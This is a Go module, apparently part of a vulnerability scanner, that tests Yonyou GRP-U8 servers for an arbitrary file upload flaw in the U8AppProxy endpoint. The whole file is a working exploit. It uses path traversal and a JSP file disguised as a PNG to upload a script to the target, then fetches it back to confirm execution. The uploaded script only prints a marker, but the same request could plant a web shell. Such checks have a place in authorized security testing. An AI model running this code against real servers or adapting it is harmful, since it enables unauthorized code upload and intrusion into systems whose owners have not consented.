package GRP_U8_U8AppProxy

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url1 := url + "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test"
	data := "--59229605f98b8cf290a7b8908b34616b\nContent-Disposition: form-data; name=\"file\"; filename=\"1.jsp\"\nContent-Type: image/png\n \n<% out.println(\"yongyouu8\");%>\n--59229605f98b8cf290a7b8908b34616b--"
	_, err := client.R().
		SetHeaders(map[string]string{ // Set multiple headers at once
			"User-Agent":   UA,
			"Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b",
		}).SetBody(data).Post(url1)
	if err != nil {
		color.Red.Println("[-] 用友 GRP-U8 U8AppProxy 任意文件上传漏洞不存在")
		return
	}
	resp1, err1 := client.R().
		SetHeaders(map[string]string{ // Set multiple headers at once
			"User-Agent": UA,
		}).Get(url + "/yongyouU8_test.jsp")
	if err1 != nil {
		color.Red.Println("[-] 用友 GRP-U8 U8AppProxy 任意文件上传漏洞不存在")
		return
	}
	if strings.Contains(resp1.String(), "yongyouu8") {
		color.Green.Println("[+] 用友 GRP-U8 U8AppProxy 任意文件上传漏洞存在")
		return
	}
	color.Red.Println("[-] 用友 GRP-U8 U8AppProxy 任意文件上传漏洞不存在")
}
